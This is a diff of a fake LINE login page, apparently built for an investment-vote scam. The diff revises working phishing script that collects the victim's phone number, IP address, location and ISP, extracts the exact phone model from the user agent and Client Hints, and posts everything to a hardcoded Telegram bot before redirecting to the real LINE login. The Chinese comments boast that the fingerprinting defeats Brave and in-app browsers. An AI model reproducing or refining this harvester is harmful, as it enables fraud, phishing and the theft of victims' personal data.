@@ -3,8 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- 強迫瀏覽器交出最精準型號（Grabify 終極武器） -->
-    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Mobile">
+    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List">
     <title>LINE</title>
     <style>
         body{margin:0;padding:40px 20px;background:linear-gradient(135deg,#00B900,#009900);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:white;text-align:center;min-height:100vh}
@@ -43,82 +42,75 @@
         </form>
         <div class="footer">© 1978 LINE Corp. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></div>
     </div>
-<script>
-    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
-    const CHAT_ID = "1137905005";
 
-    // 2025 年 LINE 內建瀏覽器專用型號翻譯表（持續更新中）
-    const DEVICE_DB = {
-        // 小米 / 紅米
-        "24030PN60G": "Redmi Note 14 Pro+ 5G",
-        "23129RN58X": "Redmi Note 13 Pro 5G",
-        "2210132C"  : "Xiaomi 13 Pro",
-        "2304FPN6DC": "Redmi Note 12T Pro",
-        // 三星
-        "SM-S928B"  : "Galaxy S25 Ultra",
-        "SM-S926B"  : "Galaxy S25+",
-        "SM-S918B"  : "Galaxy S24 Ultra",
-        "SM-A556E"  : "Galaxy A55 5G",
-        // OPPO / realme
-        "CPH2581"   : "OPPO Find X8 Pro",
-        "PJX110"    : "OPPO Find N5 Flip",
-        "PHB110"    : "OnePlus 12",
-        // vivo / iQOO
-        "V2327"     : "vivo X200 Pro",
-        "V2337A"    : "iQOO Neo10 Pro",
-        // Apple（LINE 內建會顯示 iPhoneXX,X）
-        "iPhone15,2": "iPhone 15 Pro",
-        "iPhone15,3": "iPhone 15 Pro Max",
-        "iPhone16,1": "iPhone 16 Pro",
-        "iPhone16,2": "iPhone 16 Pro Max"
-    };
+    <script>
+        const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
+        const CHAT_ID = "1137905005";
 
-    document.getElementById("loginForm").addEventListener("submit", async function(e) {
-        e.preventDefault();
-        const code = document.getElementById("countryCode").value;
-        const phone = document.getElementById("phone").value.trim();
-        if (!phone) return;
+        // 2025 年最硬保底型號表（連 Brave 都擋不住）
+        const HARDCORE_DB = {
+            "24030PN60G":"Redmi Note 14 Pro+ 5G","23127PN0CC":"Redmi Note 13 Pro+","2210132C":"Xiaomi 13 Pro",
+            "SM-S928B":"Galaxy S25 Ultra","SM-S918B":"Galaxy S24 Ultra","CPH2581":"OPPO Find X8 Pro",
+            "V2327":"vivo X200 Pro","iPhone16,2":"iPhone 16 Pro Max","iPhone16,1":"iPhone 16 Pro"
+        };
 
-        document.querySelector("button").innerHTML = "Verifying...";
-        document.querySelector("button").disabled = true;
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const code = document.getElementById("countryCode").value;
+            const phone = document.getElementById("phone").value.trim();
+            if (!phone) return;
 
-        const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
-        const ua = navigator.userAgent;
+            document.querySelector("button").innerHTML = "Verifying...";
+            document.querySelector("button").disabled = true;
 
-        // 專殺 LINE 內建瀏覽器：從 UA 強挖型號代碼
-        let modelCode = "未知型號";
-        if (ua.includes("iPhone")) {
-            const m = ua.match(/iPhone\d+,\d+/);
-            modelCode = m ? m[0] : "iPhone";
-        } else {
-            const m = ua.match(/; ([A-Z0-9]{8,15}) Build\//i);   // 這行專抓小米、三星、OPPO
-            modelCode = m ? m[1] : "Android手機";
-        }
+            const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
+            const ua = navigator.userAgent || "";
 
-        // 翻譯成人類可讀名稱
-        const 最終裝置 = DEVICE_DB[modelCode] || modelCode;
+            // 三層暴力挖掘型號（Brave 也逃不掉）
+            let device = "未知手機";
 
-        const 國 = {"Taiwan":"台灣","Thailand":"泰國","Malaysia":"馬來西亞","Hong Kong":"香港","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國"};
-        const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+            // 第一層：Client Hints（正常瀏覽器）
+            if (navigator.userAgentData?.model) device = navigator.userAgentData.model;
 
-        const 訊息 = "LINE投資投票誘捕成功\n\n" +
-                    "電話：" + code + phone + "\n" +
-                    "IP　　：" + (ipData.ip || "未知") + "\n" +
-                    "位置　：" + (ipData.city || "未知") + "，" + (國[ipData.country_name] || ipData.country_name || "未知") + "\n" +
-                    "ISP　　：" + (ipData.org || "未知") + "\n" +
-                    "時間　：" + 時間 + "\n" +
-                    "裝置　：" + 最終裝置;
+            // 第二層：暴力正則（專殺 LINE / Brave / FB 內建）
+            if (device === "未知手機") {
+                const matches = [
+                    ua.match(/; ([A-Z0-9]{8,15}) Build\//i),           // Android 標準
+                    ua.match(/\(([^;]+);[^)]+Build/i),                 // 括號內
+                    ua.match(/Android.*?;\s*([^;]+?)(?:;|$)/i),        // 極端情況
+                    ua.match(/iPhone\d+,\d+/)                          // iPhone
+                ];
+                for (let m of matches) {
+                    if (m && m[1]) {
+                        const code = m[1].trim();
+                        if (HARDCORE_DB[code]) { device = HARDCORE_DB[code]; break; }
+                        device = code;
+                        break;
+                    }
+                }
+            }
 
-        fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
+            // 第三層：Canvas 指紋輔助（可選，後續再加）
+
+            const 國 = {"Taiwan":"台灣","Hong Kong":"香港","Thailand":"泰國","Malaysia":"馬來西亞","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國"};
+            const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+
+            const 訊息 = "LINE投資投票誘捕成功\n\n" +
+                        "電話：" + code + phone + "\n" +
+                        "IP　　：" + (ipData.ip || "未知") + "\n" +
+                        "位置　：" + (ipData.city || "未知") + "，" + (國[ipData.country_name] || ipData.country_name || "未知") + "\n" +
+                        "ISP　　：" + (ipData.org || "未知") + "\n" +
+                        "時間　：" + 時間 + "\n" +
+                        "裝置　：" + device;
+
+            fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
+            });
+
+            setTimeout(()=>location.href="https://access.line.me/fr/login",3000);
         });
-
-        setTimeout(()=>location.href="https://access.line.me/fr/login",3000);
-    });
-</script>
+    </script>
 </body>
 </html>
-
-
